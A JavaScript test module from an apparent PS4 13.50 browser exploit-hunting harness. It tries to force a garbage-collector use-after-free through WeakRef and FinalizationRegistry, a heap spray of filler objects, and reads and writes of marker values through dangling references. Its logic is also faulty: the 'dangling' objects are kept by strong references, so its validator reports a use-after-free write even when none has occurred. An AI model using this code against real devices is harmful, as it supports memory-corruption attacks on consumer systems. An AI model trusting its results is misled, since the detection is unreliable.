/**
 * TEST: GC Use-After-Free via WeakRef manipulation
 * Tenta causar UAF explorando timing de GC
 * PS4 13.50: WeakRef=true, FinalizationRegistry disponível
 */

export const testGcUaf = {
    id: 'GC_UAF',
    name: 'GC Use-After-Free',
    risk: 'CRITICAL',
    category: 'GC',
    description: 'Tenta usar objetos após coleta via WeakRef race conditions',
    ps4Compatible: true,
    
    setup: function() {
        this.UAF_CANDIDATES = 100;
        this.victims = [];
        this.weakRefs = [];
        this.collectedVictims = [];
        this.uafDetected = false;
        
        // Cria objetos vítima com estruturas complexas
        for (let i = 0; i < this.UAF_CANDIDATES; i++) {
            const victim = {
                id: i,
                data: new Array(100).fill(i),
                secret: `SECRET_${i.toString(16)}`,
                buffer: new ArrayBuffer(64),
                view: new Uint32Array(64 / 4),
                nested: {
                    a: i * 100,
                    b: [i, i + 1, i + 2],
                    c: { deep: 'value_' + i }
                }
            };
            
            // Preenche buffer com padrão único
            victim.view.fill(0xDEAD0000 + i);
            
            this.victims.push(victim);
            
            // Cria WeakRef
            if (typeof WeakRef !== 'undefined') {
                this.weakRefs.push(new WeakRef(victim));
            }
        }
        
        // Registra no FinalizationRegistry
        if (typeof FinalizationRegistry !== 'undefined') {
            this.registry = new FinalizationRegistry((id) => {
                this.collectedVictims.push(id);
            });
            
            for (const victim of this.victims) {
                this.registry.register(victim, victim.id);
            }
        }
        
        // Salva referências para acesso pós-coleta
        this.danglingRefs = this.victims.slice(0, 10);
        this.danglingIndexes = this.danglingRefs.map(v => v.id);
    },
    
    probe: [
        // Probe 0: Número de vítimas coletadas
        function(scenario) {
            return scenario.collectedVictims?.length ?? 0;
        },
        
        // Probe 1: Dangling ref ainda acessível?
        function(scenario) {
            try {
                const ref = scenario.danglingRefs[0];
                return ref ? `alive(id=${ref.id}, data=${ref.data?.length})` : 'null';
            } catch (e) {
                return 'CRASH_' + e.message.slice(0, 30);
            }
        },
        
        // Probe 2: WeakRef status da primeira vítima
        function(scenario) {
            if (!scenario.weakRefs || scenario.weakRefs.length === 0) return 'NO_WEAKREF';
            try {
                const deref = scenario.weakRefs[0]?.deref();
                return deref ? 'ALIVE' : 'COLLECTED';
            } catch (e) {
                return 'ERROR';
            }
        },
        
        // Probe 3: Buffer da vítima 0 ainda íntegro?
        function(scenario) {
            try {
                const victim = scenario.victims[0];
                if (!victim) return 'NULL_VICTIM';
                return '0x' + victim.view[0]?.toString(16);
            } catch (e) {
                return '💥 UAF: ' + e.message.slice(0, 40);
            }
        },
        
        // Probe 4: Tentativa de escrever em vítima coletada
        function(scenario) {
            try {
                const ref = scenario.danglingRefs[0];
                if (ref) {
                    const before = ref.view[0];
                    ref.view[0] = 0xCAFEBABE;
                    const after = ref.view[0];
                    return `write_ok: ${before.toString(16)} -> ${after.toString(16)}`;
                }
                return 'NO_REF';
            } catch (e) {
                return 'CRASH: ' + e.message.slice(0, 30);
            }
        }
    ],
    
    trigger: function() {
        // Passo 1: Libera a maioria das vítimas
        for (let i = 0; i < this.victims.length; i++) {
            if (!this.danglingIndexes.includes(i)) {
                this.victims[i] = null;
            }
        }
        
        // Passo 2: Força GC agressivo
        if (typeof gc === 'function') {
            gc();
            gc(); // Dupla coleta
        }
        
        // Passo 3: Aloca novos objetos para ocupar espaço liberado
        this.fillerObjects = [];
        for (let i = 0; i < 500; i++) {
            this.fillerObjects.push({
                junk: new Array(100).fill(Math.random()),
                buffer: new ArrayBuffer(64),
                id: 'FILLER_' + i
            });
        }
        
        // Passo 4: Tenta acessar dangling references
        for (const ref of this.danglingRefs) {
            try {
                // Tenta ler dados (possível UAF)
                const id = ref.id;
                const dataLen = ref.data?.length;
                const bufferVal = ref.view?.[0];
                
                if (bufferVal !== undefined && bufferVal !== 0xDEAD0000 + id) {
                    this.uafDetected = true;
                    this.leakedValue = {
                        expectedId: id,
                        expectedBuffer: 0xDEAD0000 + id,
                        actualBuffer: bufferVal,
                        dataLen: dataLen
                    };
                }
                
                // Tenta escrever (UAF write)
                ref.view[0] = 0x41414141;
                
            } catch (e) {
                // Crash esperado se GC limpou corretamente
            }
        }
        
        // Passo 5: Mais GC
        if (typeof gc === 'function') gc();
    },
    
    cleanup: function() {
        this.victims = null;
        this.weakRefs = null;
        this.danglingRefs = null;
        this.fillerObjects = null;
        this.registry = null;
    },
    
    customValidator: function(baseResults, afterResults) {
        // Se conseguiu escrever em objeto coletado
        if (afterResults[4].startsWith('write_ok')) {
            return {
                anomaly: true,
                reason: `💥 UAF WRITE: Escrita bem-sucedida em objeto coletado! ${afterResults[4]}`
            };
        }
        
        // Se vítima foi coletada mas ainda acessível
        const probe1 = afterResults[1];
        const probe2 = afterResults[2];
        
        if (probe2 === 'COLLECTED' && probe1.startsWith('alive')) {
            return {
                anomaly: true,
                reason: `🏆 UAF CONFIRMED: WeakRef diz COLLECTED mas objeto ainda acessível: ${probe1}`
            };
        }
        
        // Se buffer mostra valor inesperado (possível reuso de memória)
        if (this.uafDetected && this.leakedValue) {
            return {
                anomaly: true,
                reason: `💥 UAF LEAK: Buffer corrompido após coleta: esperado=0x${this.leakedValue.expectedBuffer.toString(16)}, real=0x${this.leakedValue.actualBuffer?.toString(16)}`
            };
        }
        
        return { anomaly: false, reason: '' };
    }
};
